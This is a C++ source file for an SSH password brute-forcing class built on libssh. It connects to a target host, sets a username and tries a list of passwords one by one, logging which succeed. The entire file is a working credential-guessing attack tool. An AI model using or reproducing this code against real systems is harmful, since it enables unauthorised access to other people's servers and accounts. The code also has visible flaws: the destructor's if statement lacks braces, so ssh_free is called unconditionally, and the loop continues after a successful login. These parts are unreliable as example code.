#include <iostream>
#include <libssh/libssh.h>
#include <vector>
#include <string>
#include "sshBrute.h"

SSHBrute::SSHBrute(std::string _host, int _port) {
    hostname = _host;
    port = _port;
    _logger = spdlog::get("logger");
}

void SSHBrute::initSession()
{
    _logger->debug("reset ssh session");
    if (session != NULL) {
        _logger->debug("deleting old ssh session");
        ssh_free(session);
    }

    session = ssh_new();
    if (session == NULL) {
        _logger->error("unable to create new ssh session");
        std::cerr << "Unable to create new session\n";
        exit(-1);
    }
    _logger->debug("new ssh session created");
    ssh_options_set(session, SSH_OPTIONS_HOST, hostname.c_str());
    ssh_options_set(session, SSH_OPTIONS_PORT, &port);
}

SSHBrute::~SSHBrute() {
    if (session != NULL)
        _logger->debug("deleting ssh session");
        ssh_free(session);
}

void SSHBrute::setUser(std::string username) {
    _logger->info("setting user to {}", username);
    initSession();
    ssh_options_set(session, SSH_OPTIONS_USER, username.c_str());
}

void SSHBrute::connect(std::vector<std::string> password) {
    int rc = ssh_connect(session);
    if (rc != SSH_OK) {
        _logger->error("error in connecting to {}: {}",
                       hostname, ssh_get_error(session));
        std::cerr << "Error Connecting to "<< hostname << std::endl;
        ssh_free(session);
        exit(-1);
    }

    for (int i = 0; i < password.size(); i++) {
        rc = ssh_userauth_password(session, NULL, password[i].c_str());
        if ( rc == SSH_AUTH_SUCCESS )
            _logger->info("password {} -> correct", password[i]);
        else
            _logger->info("password {} -> incorrect", password[i]);
    }
    ssh_disconnect(session);
}
